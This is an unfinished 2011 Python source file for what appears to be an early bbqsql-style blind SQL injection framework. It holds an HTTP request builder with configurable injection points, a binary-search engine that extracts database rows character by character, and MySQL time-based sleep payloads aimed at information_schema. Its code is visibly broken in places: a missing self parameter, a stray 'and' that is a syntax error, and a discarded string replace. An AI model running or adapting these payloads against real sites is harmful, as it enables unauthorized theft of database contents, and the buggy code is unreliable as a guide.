##NOT FINISHED##
##mastahyeti 2011##
import urllib2
import urllib
import time
import math
import debug
from sys import stdout

CHARSET = [chr(x) for x in xrange(32,127)]
#CHARSET = [chr(x) for x in xrange(32,39)] + [chr(x) for x in xrange(40,127)] #everything but '
CHARSET_LEN = len(CHARSET)

#Supress output when possible
QUIET = False

#Debugging settings.
debug.DEBUG_FUNCTION_CALL = False
debug.DEBUG_FUNCTION_RETURN = False

#TODO:
#implement a diff function with some sort of regex. for non-time based blind that might have variations between identical requests. probably part of response
#Implement a _eq_size method for response
#Implement test functions for techniques (maybe. up for discussion. depends on if we want automated testing of many techniques)
#Implement some sort of interface. need to be able to list/search techniques by dbms/technique/blah. Also need to be able to launch attach.
#interface needs to include parser for raw http requests (simplifies firing an attack)


class NotImplemented(Exception):
    '''Throw this exception when a method that hasn't been implemented gets called'''
    def __init__(self, value):
        self.value = value
    def __repr__(self):
        return "This isn't implemented yet: " + self.value

class query(object):
    '''
    A query is a string that can be rendered (think prinf). 
    query syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
    Anything inside ${} will be settable and will be rendered based on value set. For example: 
    
    >>> q = bbqsql.query("hello ${x:world}")
    >>> print q.render()
    hello world
    >>> q.set_option('x','Ben')
    >>> print q.render()
    hello Ben
    '''
    @debug.func
    def __init__(self,q_string,options=None):
        '''
        q_string syntax is "SELECT ${blah:default_blah}, ${foo:default_foo} from ${asdf:default_asdf}". 
        The options are specified in ${}, with the value before the ':' being the option name
        and the value after the ':' being the default value. 

        There is an optional options parameter that allows you to set the option values manually rather than
        having them be parsed.
        '''
        self.q_string = q_string
        if options:
            self.options = options
        else:
            self.options = self.parse_query(q_string)
    
    @debug.func
    def get_option(self,ident):
        '''
        Get the option value whose name is 'ident'
        '''
        return self.options[ident]
    
    @debug.func
    def set_option(self,ident,val):
        '''
        Set the value of the option whose name is 'ident' to val
        '''
        self.options[ident] = val

    @debug.func
    def get_options(self):
        '''
        Get all of the options (in a dict) for the query
        '''
        return self.options
    
    @debug.func
    def set_options(self,options):
        '''
        Set the queries option (dict).
        '''
        self.options = options
    
    @debug.func
    def parse_query(self,q):
        '''
        This is mostly an internal method, but I didn't want to make it private.
        This takes a query string and returns a options dict.
        '''
        options = {}
        section = q.split("${")
        if len(section) > 1:
            for section in section[1:]:
                inside = section.split("}")[0].split(":")
                ident = inside[0]
                if len(inside) > 1:
                    default = inside[1]
                else:
                    default = ""
                options[ident] = default
        return options
    
    @debug.func
    def render(self):
        '''
        This compiles the queries options and the original query string into a string.
        See the class documentation for an example.
        '''
        section = self.q_string.split("${")
        output = section[0]
        if len(section) > 1:
            for section in section[1:]:
                split = section.split('}')
                left = split[0]
                #in case there happens to be a rogue } in our query
                right = '}'.join(split[1:])
                ident = left.split(':')[0]
                val = self.options[ident]
                output += val
                output += right
        return output

    @debug.func
    def copy(self):
        '''
        Deep (enough) copy of a query
        '''
        return query(self.q_string,self.options)


class requester(object):
    '''
    Requester objects are what make actual requests (http or otherwise). The point is
    to abstract away all of the details of how a request is made, so that the technique
    doesn't need to know whether the values it comes up with will be going into an http
    request or a JSON query. This class is just a prototype and the __init__ function and
    make_request function must be overridden. All setup should take place in the __init__ 
    method and the make_request method should only take one parameter. The make_request method
    takes a value as a parameter. This is the value that is to be tested or injected or whatever.
    The __init__ method should contain enough logic such that this is possible. It would be 
    easier to have the make_request method take more optional parameters, but it would decrease
    the portability of requests and techniques
    '''
    def __init__(self):
        raise NotImplemented
    
    def make_request(self,value):
        raise NotImplemented


class technique(object):
    '''
    This is a sql injection teqnique. Eg. Union based or Time based. Techniques need
    to implement at minimum the run method which is what actually launches the technique.
    Techniques will usually also take a user_query (query we are trying to run on the db).
    The class init init will (almost?) always take a make_request_func as a param. This
    option specifies the function to call to make an actual request. 
    '''
    @debug.func
    def __init__(self,make_request_func): 
        self.make_request_func = make_request_func
        if type(self) == technique:
            raise NotImplemented

    def run(self):
        '''
        This is a prototype. This will run the technique (exploit the vuln).
        '''
        raise NotImplemented("technique.run")


class blind_technique(technique):
    '''
    This is a prototype for a blind sql injection technique. This isn't fully implemented
    because there are various types of blind sql injection. To implement this technique you 
    need to implement _is_greater, _is_equal, _make_base_request. 
    '''
    @debug.func
    def run(self,user_query):
        user_query = user_query
        try:
            self.base_response
        except AttributeError:
            self._make_base_request()
        results = []
        row_index = 0
        row = True
        #we get more rows until the table is over
        while row:
            #if this isnt the first iteration
            if row != True:
                results.append(row)
            row = self._get_next_row(row_index,user_query)
            row_index += 1
        return results

    @debug.func
    def _get_next_row(self,row_index,user_query):
        #finding a row
        row = ""
        char_index = 1
        char = True
        #we get more chars until the row is over
        while char:
            #if this isnt the first iteration
            if char != True:
                row += char
            char = self._get_next_char(char_index,row_index,user_query)
            char_index += 1
        if row != "":
            return row
        else:
            return False

    @debug.func
    def _get_next_char(self,char_index,row_index,user_query):
        #finding a character
        low = 0
        high = CHARSET_LEN
        while low < high:
            mid = (low+high)//2
            update_char(CHARSET[mid])
            if self._is_greater(row_index, char_index, CHARSET[mid],user_query):
                high = mid
            else:
                low = mid
        mid = (low+high)//2
        if low < CHARSET_LEN and self._is_equal(row_index, char_index, CHARSET[mid],user_query):
            update_char()
            return CHARSET[mid]
        else:
            end_line()
            return False

    def _is_greater(self,row_index,char_index,char_val):
        '''
        Returns true if the specified character in the specified row is greater
        that char_value. It is up to you how to implement this...
        '''
        raise NotImplemented("blind_technique._is_greater")

    def _is_equal(self,row_index,char_index,char_val):
        '''
        Returns true if the specified character in the specified row is equal
        that char_value. It is up to you how to implement this...
        '''        
        raise NotImplemented("blind_technique._is_equal")
    
    def _make_base_request(self):
        '''
        Makes the base request to which all subsequent requests will be compared.
        The need for a base request is just a fact when dealing with blind sqli
        '''
        raise NotImplemented("blind_technique.make_base_request")


class time_blind_technique(blind_technique):
    '''
    This is a time based blind sqli technique. 
    The only thing that isn't implemented for this to work is
    the actuall query strings which will varry between DBMSs. 
    See below (mysql_time_blind_technique) for a fully functional
    technique.
    '''
    @debug.func
    def __init__(self,make_request_func,sleep=2):
        self.sleep = sleep
        super(time_blind_technique,self).__init__(make_request_func)
        if type(self) == time_blind_technique:
            raise NotImplemented('time_blind_technique is dbms agnostic and hence cannot be run...')
    
    @debug.func
    def _is_greater(self,row_index,char_index,char_val,user_query):
        query = self.query_greater.copy()
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query_string = query.render()
        res = self.make_request_func(query_string)
        return not res.time_eq(self.base_response)

    @debug.func
    def _is_equal(self,row_index,char_index,char_val,user_query):
        query = self.query_equal.copy()
        query.set_option('user_query',user_query)
        query.set_option('row_index',str(row_index))
        query.set_option('char_index',str(char_index))
        query.set_option('char_val',str(ord(char_val)))
        query.set_option('sleep',str(self.sleep))
        query_string = query.render()
        res = self.make_request_func(query_string)
        return not res.time_eq(self.base_response)
    
    @debug.func
    def _make_base_request(self):
        self.base_response = self.make_request_func()


class mysql_time_blind_technique(time_blind_technique):
    '''
    fully implemeted time based blind sqli technique.
    '''
    @debug.func
    def __init__(make_request_func,sleep=2):
        self.query_greater = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))>${char_val:123},sleep(${sleep:2}),0)=0")
        self.query_equal = query(" and if(ascii(substr((${user_query:SELECT table_name FROM information_schema.tables WHERE  table_schema != 'mysql' AND table_schema != 'information_schema'} LIMIT 1 OFFSET ${row_index:0}),${char_index:1},1))=${char_val:123},sleep(${sleep:2}),0)=0")
        super(mysql_time_blind_technique,self).__init__(make_request_func,sleep=sleep)


class get_http_requester(requester):
    '''
    This object makes requests. You configure it upon instantiation and then
    call the make_request method with the modifications to be made to the base request.
    For example: you setup the object to make HTTP GET requests to 
    http://example.com?search=foo . To test different variations of the search 
    parameter, you then call the make_request method, specifying what values
    you would like to use.
    '''
    @debug.func
    def __init__(
        self,
        url,
        port=80,
        uri="/",
        uri_injection_points=[],
        query_string={},
        query_injection_points=[],
        headers={},
        headers_injection_points=[],
        data={},
        data_injection_points=[]):
        '''
        url - url should include protocol and domain. eg. "https://example.com"
        
        port - port should be an integer. this defaults to port 80.
        
        uri - path to the resource. defaults to /. eg. "/mydir/myscript.php"
        
        uri_injection_points - parts of the URI to replace with the value passed to 
        make_request. We will use str.replace() method, so be careful of repeating 
        strings and such....

        query - we are assuming that the query string will take on the normal
        formal of http://example.com?key=value&key2=value2. To make 
        the implementation of this simpler, this comes in as a dictionary.
        this is less extensible than taking a string, but it makes my life
        a bit easier... eg. {'key':'value','key2':'value2'}
        
        query_injection_points - parts of the query_string to replace with the 
        value passed to make_request (dictionary key)
        
        headers - HTTP headers as a dictionary. to be on the safe side you could encode
        this before passing it in.
        Eg. {'User-Agent':'Mozilla/5.0','Custom-Header':'Custom Value'}
        
        headers_injection_points - parts of the headers to replace with the value passed 
        to make_request (dictionary key)
        
        data - POST data as an array. Same issues and format as query_string. see above
        we decide whether to GET or POST based on presence of data parameter.
        
        data_injection_points - parts of the data to replace with the value passed to 
        make_request (dictionary key)
        '''

        self.url = url
        self.port = port
        self.uri = uri
        self.uri_injection_points = uri_injection_points
        self.query_string = query_string
        self.query_injection_points = query_injection_points
        self.headers = headers
        self.headers_injection_points = headers_injection_points
        self.data = data
        self.data_injection_points = data_injection_points

        #make sure our URI starts with a /
        if uri[0] != '/': uri = "/" + uri
        
    @debug.func
    def make_request(self,value=""):
        '''
        This method makes the requests. By the time you are calling this, the class
        should already be set up. The value you provide to this method gets
        included into the part of the request that you set up during 
        instantiation. 
        '''
        #set up some vars
        uri = self.uri
        query_string = self.query_string.copy()
        headers = self.headers.copy()
        data = self.data.copy()
        #parse all of the injection points
        for r in self.uri_injection_points:
            uri.replace(r,urllib.urlencode(value))
        for r in self.query_injection_points:
            query_string[r] = query_string.get(r,"") + value
        for r in self.headers_injection_points:
            headers[r] = headers.get(r,"") + urllib.urlencode(value)
        for r in self.data_injection_points:
            data[r] = data.get(r,"") + value
        #build out a few things
        query_string = urllib.urlencode(query_string)
        data = urllib.urlencode(data)
        #construct out request_url
        request_url = self.url + ":" + str(self.port) + uri + '?' + query_string
        #build a urllib2.Request object
        request = urllib2.Request(request_url,headers=headers,data=data)
        #prepare our variables for our response object
        time_start = time.time()
        raw_res = urllib2.urlopen(request)
        time_stop  = time.time()
        time_delta = time_stop - time_start
        data = raw_res.read()
        #create our response object
        res = http_response(data,time_delta)
        return res


class http_response(object):
    '''
    Response objects abstract away the various response types gererated by
    various request types. Response objects should implement methods
    for comparing responses based on size, time, value..... This is just 
    an example http response object
    '''
    @debug.func
    def __init__(self,data,time_delta):
        self.data = data
        self.time_delta = time_delta
    
    @debug.func
    def get_time(self):
        return self.time_delta

    @debug.func
    def get_data(self):
        return self.data

    @debug.func
    def data_eq(self,response):
        '''
        return true if the data in this and response are the same
        '''
        return self.data == response.get_data()

    @debug.func
    def time_eq(self,response,error_percent=75):
        '''
        return true if the time for this and the response are roughly the same.
        #TODO: At some point this will be more flexible....
        '''
        #we call them equal if their times differ by less than 75 percent from the base. this should be adjusted in the future for performace optimization TODO
        return error_percent > (math.fabs(self.time_delta - response.get_time())/((self.time_delta - response.get_time())/2))*100

@debug.func
def update_char(c=None):
    '''
    This just helps with fancy output. This deletes the last printed character from
    the terminal and replaces it with the specified character. This way, with blind sqli,
    we can have it appear to scroll through the characters it is testing and whatnot...
    Note that when using this you will need to manually delete the last character if you don't
    want it there and probably will need to use the end_line() function (bellow) for printing 
    a good looking new line.....
    '''
    if not QUIET:
        if c:
            stdout.write("\x08")
            stdout.write(c)
            stdout.flush()
        else:
            stdout.write(" ")
            stdout.flush()

@debug.func
def end_line():
    '''
    This is for fancy output. It deletes the last character printed to the terminal and
    starts a new line...
    '''
    and 
    if not QUIET:
        stdout.write("\x08 \n")
        stdout.flush()

if __name__ == "__main__":
    pass
    
